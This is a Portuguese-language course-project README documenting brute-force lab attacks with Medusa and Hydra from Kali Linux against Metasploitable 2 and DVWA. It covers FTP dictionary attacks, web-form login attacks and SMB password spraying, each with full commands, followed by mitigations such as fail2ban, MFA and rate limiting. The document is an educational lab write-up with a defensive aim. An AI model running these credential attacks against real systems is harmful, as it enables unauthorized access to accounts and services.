# 🔐 Projeto de Auditoria de Segurança: Ataques de Força Bruta com Medusa e Kali Linux

## 📋 Sumário
- [Sobre o Projeto](#sobre-o-projeto)
- [Objetivos](#objetivos)
- [Ambiente de Teste](#ambiente-de-teste)
- [Conceitos Fundamentais](#conceitos-fundamentais)
- [Cenários de Ataque Implementados](#cenários-de-ataque-implementados)
- [Medidas de Mitigação](#medidas-de-mitigação)
- [Conclusões e Aprendizados](#conclusões-e-aprendizados)
- [Referências](#referências)

---

## 🎯 Sobre o Projeto

Este projeto documenta a implementação prática de ataques de força bruta em ambiente controlado, utilizando **Kali Linux** e a ferramenta **Medusa**. O objetivo é compreender vulnerabilidades de autenticação, testar técnicas de ataque e propor medidas efetivas de prevenção.

> ⚠️ **AVISO LEGAL**: Todos os testes foram realizados em ambiente isolado e controlado, utilizando máquinas virtuais configuradas especificamente para fins educacionais. A execução de ataques de força bruta contra sistemas sem autorização é **ILEGAL** e pode resultar em consequências criminais.

---

## 🎓 Objetivos

- Compreender diferentes tipos de ataques de força bruta
- Configurar ambiente de teste seguro e isolado
- Executar ataques simulados em serviços FTP, Web e SMB
- Documentar processos técnicos de forma estruturada
- Identificar vulnerabilidades e propor contramedidas
- Desenvolver consciência sobre segurança defensiva

---

## 🖥️ Ambiente de Teste

### Configuração das Máquinas Virtuais

**Máquina Atacante:**
- Sistema Operacional: Kali Linux 2024.x
- Ferramenta Principal: Medusa 2.2
- Ferramentas Auxiliares: Nmap, Hydra, CrackMapExec
- Memória RAM: 2GB
- Rede: Host-Only Adapter

**Máquina Alvo:**
- Sistema Operacional: Metasploitable 2
- Serviços Vulneráveis: FTP, SSH, SMB, HTTP
- Aplicação Web: DVWA (Damn Vulnerable Web Application)
- Memória RAM: 1GB
- Rede: Host-Only Adapter

### Topologia de Rede

```
┌─────────────────────┐         ┌─────────────────────┐
│   Kali Linux        │         │  Metasploitable 2   │
│   (Atacante)        │◄───────►│     (Alvo)          │
│   IP: 192.168.56.10 │         │  IP: 192.168.56.20  │
└─────────────────────┘         └─────────────────────┘
        Rede Interna (Host-Only)
```

### Passos de Configuração

1. **Instalação do VirtualBox**
   - Download da versão mais recente
   - Configuração de rede Host-Only

2. **Configuração do Kali Linux**
   ```bash
   # Atualizar sistema
   sudo apt update && sudo apt upgrade -y
   
   # Verificar instalação do Medusa
   medusa -V
   
   # Instalar ferramentas complementares
   sudo apt install nmap hydra crackmapexec -y
   ```

3. **Configuração do Metasploitable 2**
   ```bash
   # Verificar serviços ativos
   sudo netstat -tulpn
   
   # Configurar DVWA
   # Acesso via navegador: http://192.168.56.20/dvwa
   # Credenciais padrão: admin / password
   ```

---

## 📚 Conceitos Fundamentais

### O que é Força Bruta?

Ataque de força bruta é uma técnica de quebra de autenticação que testa sistematicamente todas as combinações possíveis de credenciais até encontrar a correta.

### Tipos de Ataques

#### 1. **Ataque de Dicionário**
Utiliza listas pré-compiladas de senhas comuns.
- Mais rápido que força bruta pura
- Efetivo contra senhas fracas
- Depende da qualidade da wordlist

#### 2. **Força Bruta Pura (Permutação)**
Testa todas as combinações possíveis de caracteres.
- Extremamente demorado
- Garante sucesso (dado tempo suficiente)
- Inviável para senhas longas e complexas

#### 3. **Ataque Híbrido**
Combina dicionário com modificações (números, símbolos).
- Equilíbrio entre velocidade e abrangência
- Exemplo: "senha" → "senha123", "senha!", "Senha2024"

#### 4. **Password Spraying**
Testa uma senha comum contra múltiplos usuários.
- Evita bloqueio por tentativas excessivas
- Efetivo em ambientes corporativos
- Exemplo: testar "Verão2024!" em todas as contas

#### 5. **Credential Stuffing**
Utiliza credenciais vazadas de outros serviços.
- Explora reutilização de senhas
- Alta taxa de sucesso
- Requer bases de dados de vazamentos

### Sobre o Medusa

Medusa é uma ferramenta de linha de comando modular e paralela para testes de força bruta contra diversos protocolos de autenticação.

**Características:**
- Suporte a 20+ protocolos (FTP, SSH, HTTP, SMB, etc.)
- Execução paralela de threads
- Modular e extensível
- Rápido e eficiente

**Sintaxe Básica:**
```bash
medusa -h [host] -u [usuário] -P [wordlist] -M [módulo] -t [threads]
```

---

## 🎯 Cenários de Ataque Implementados

### Cenário 1: Ataque de Força Bruta em FTP

#### Objetivo
Testar a segurança do serviço FTP através de ataque de dicionário.

#### Preparação

**Criação da Wordlist:**
```bash
# Criar wordlist simples
cat > passwords_ftp.txt << EOF
123456
password
admin
root
toor
metasploitable
user
msfadmin
EOF
```

#### Reconhecimento
```bash
# Descobrir serviços ativos
nmap -sV -p 21 192.168.56.20

# Resultado esperado:
# PORT   STATE SERVICE VERSION
# 21/tcp open  ftp     vsftpd 2.3.4
```

#### Execução do Ataque
```bash
# Ataque com usuário conhecido
medusa -h 192.168.56.20 -u msfadmin -P passwords_ftp.txt -M ftp -t 4

# Ataque com múltiplos usuários
medusa -h 192.168.56.20 -U users.txt -P passwords_ftp.txt -M ftp -t 4 -f

# Opções:
# -h: host alvo
# -u: usuário único
# -U: lista de usuários
# -P: lista de senhas
# -M: módulo (ftp)
# -t: número de threads
# -f: parar após primeiro sucesso
```

#### Resultado Esperado
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

#### Validação de Acesso
```bash
# Conectar via FTP
ftp 192.168.56.20
# Usuário: msfadmin
# Senha: msfadmin

# Listar diretórios
ls -la

# Desconectar
bye
```

---

### Cenário 2: Ataque em Aplicação Web (DVWA)

#### Objetivo
Automatizar tentativas de login em formulário web.

#### Preparação do DVWA

1. Acessar: `http://192.168.56.20/dvwa`
2. Login inicial: `admin / password`
3. Configurar nível de segurança: **Low**
4. Navegar para: **Brute Force**

#### Análise do Formulário

Inspecionar a requisição de login:
```bash
# Usar Burp Suite ou inspecionar elemento
# URL: http://192.168.56.20/dvwa/vulnerabilities/brute/
# Método: GET
# Parâmetros: username, password, Login
```

#### Criação da Wordlist
```bash
cat > passwords_web.txt << EOF
password
admin
123456
letmein
welcome
monkey
dragon
master
EOF
```

#### Execução do Ataque com Medusa
```bash
# Ataque ao formulário de login do DVWA
medusa -h 192.168.56.20 -u admin -P passwords_web.txt -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/:GET:username=^USER^&password=^PASS^:F=incorrect:H=Cookie\: security=low; PHPSESSID=<session_id>" \
  -t 2

# Nota: Substituir <session_id> pelo cookie de sessão válido
```

#### Alternativa com Hydra
```bash
# Hydra pode ser mais adequado para formulários web
hydra -l admin -P passwords_web.txt 192.168.56.20 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=<session_id>"
```

#### Validação
Testar credenciais encontradas manualmente no navegador.

---

### Cenário 3: Password Spraying em SMB

#### Objetivo
Testar uma senha comum contra múltiplos usuários no protocolo SMB.

#### Reconhecimento
```bash
# Enumerar serviço SMB
nmap -p 139,445 --script smb-enum-shares,smb-enum-users 192.168.56.20

# Usar enum4linux para enumeração completa
enum4linux -a 192.168.56.20
```

#### Enumeração de Usuários
```bash
# Criar lista de usuários descobertos
cat > users_smb.txt << EOF
root
msfadmin
user
service
postgres
ftp
EOF
```

#### Password Spraying
```bash
# Testar senha comum contra todos os usuários
medusa -h 192.168.56.20 -U users_smb.txt -p msfadmin -M smbnt -t 2

# Opções:
# -U: lista de usuários
# -p: senha única (spraying)
# -M: módulo smbnt
```

#### Validação de Acesso
```bash
# Conectar via smbclient
smbclient -L //192.168.56.20 -U msfadmin

# Acessar compartilhamento
smbclient //192.168.56.20/tmp -U msfadmin

# Listar arquivos
ls
```

---

## 🛡️ Medidas de Mitigação

### Defesas contra Força Bruta

#### 1. **Políticas de Senha Forte**
```
Requisitos:
- Mínimo de 12 caracteres
- Combinação de maiúsculas, minúsculas, números e símbolos
- Proibir senhas comuns (dicionário)
- Histórico de senhas (não reutilizar últimas 5)
- Expiração periódica (90 dias)
```

#### 2. **Limitação de Tentativas (Rate Limiting)**

**Para SSH/FTP (fail2ban):**
```bash
# Instalar fail2ban
sudo apt install fail2ban

# Configurar jail
sudo nano /etc/fail2ban/jail.local

[sshd]
enabled = true
maxretry = 3
bantime = 3600
findtime = 600
```

**Para aplicações web:**
```php
// Implementar throttling
if ($failed_attempts >= 5) {
    sleep(pow(2, $failed_attempts)); // Exponential backoff
}
```

#### 3. **Autenticação Multifator (MFA)**
- Código SMS/Email
- Aplicativos autenticadores (Google Authenticator, Authy)
- Chaves de segurança físicas (YubiKey)

#### 4. **CAPTCHA**
Implementar após 2-3 tentativas falhas em formulários web.

#### 5. **Bloqueio por IP**
```bash
# Usando iptables
iptables -A INPUT -s 192.168.56.10 -j DROP

# Usando UFW
ufw deny from 192.168.56.10
```

#### 6. **Monitoramento e Alertas**
```bash
# Monitorar logs de autenticação
tail -f /var/log/auth.log | grep "Failed password"

# Configurar alertas
# Implementar SIEM (Security Information and Event Management)
```

#### 7. **Desabilitar Contas Padrão**
```bash
# Remover usuários não utilizados
sudo userdel -r guest

# Renomear conta admin
sudo usermod -l newadmin admin
```

#### 8. **Implementar Delay Progressivo**
Aumentar tempo de resposta após cada tentativa falha.

---

## 🔍 Conclusões e Aprendizados

### Principais Descobertas

1. **Vulnerabilidade de Senhas Fracas**
   - Senhas padrão foram comprometidas em segundos
   - Wordlists pequenas foram suficientes para sucesso
   - Reutilização de credenciais facilita ataques

2. **Efetividade do Medusa**
   - Ferramenta poderosa e versátil
   - Suporte multi-protocolo simplifica testes
   - Paralelização acelera significativamente os ataques

3. **Importância da Defesa em Profundidade**
   - Nenhuma medida única é suficiente
   - Combinação de controles técnicos e procedimentais
   - Monitoramento contínuo é essencial

### Reflexões sobre Segurança

**Perspectiva do Atacante:**
- Ferramentas acessíveis tornam ataques triviais
- Automação permite escala massiva
- Reconhecimento adequado aumenta taxa de sucesso

**Perspectiva do Defensor:**
- Configurações padrão são alvos fáceis
- Educação de usuários é crítica
- Detecção precoce minimiza danos

### Competências Desenvolvidas

✅ Configuração de ambiente de teste isolado  
✅ Utilização de ferramentas de auditoria ofensiva  
✅ Análise de protocolos de autenticação  
✅ Documentação técnica estruturada  
✅ Pensamento crítico sobre segurança defensiva  
✅ Compreensão de ataques e contramedidas  

---

## 📁 Estrutura do Repositório

```
brute-force-project/
├── README.md
├── wordlists/
│   ├── passwords_ftp.txt
│   ├── passwords_web.txt
│   └── users_smb.txt
├── scripts/
│   ├── setup_environment.sh
│   └── run_tests.sh
├── images/
│   ├── network_topology.png
│   ├── medusa_ftp_success.png
│   ├── dvwa_bruteforce.png
│   └── smb_enumeration.png
└── docs/
    ├── detailed_methodology.md
    └── mitigation_checklist.md
```

---

## 🔗 Referências

### Documentação Oficial
- [Kali Linux – Site Oficial](https://www.kali.org/)
- [Medusa – Documentação](http://foofus.net/goons/jmk/medusa/medusa.html)
- [DVWA – Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Metasploitable 2 – Rapid7](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [OWASP – Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

### Materiais Complementares
- [NIST – Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [SecLists – Wordlists para Pentest](https://github.com/danielmiessler/SecLists)

---

## 👤 Autor

**[Seu Nome]**  
Estudante de Cibersegurança  
[Seu LinkedIn] | [Seu GitHub]

---

## 📄 Licença

Este projeto é disponibilizado apenas para fins educacionais. O autor não se responsabiliza pelo uso indevido das técnicas e ferramentas aqui documentadas.

---

**⭐ Se este projeto foi útil para você, considere dar uma estrela no repositório!**

---

*Projeto desenvolvido como parte do curso de Cibersegurança da DIO (Digital Innovation One)*
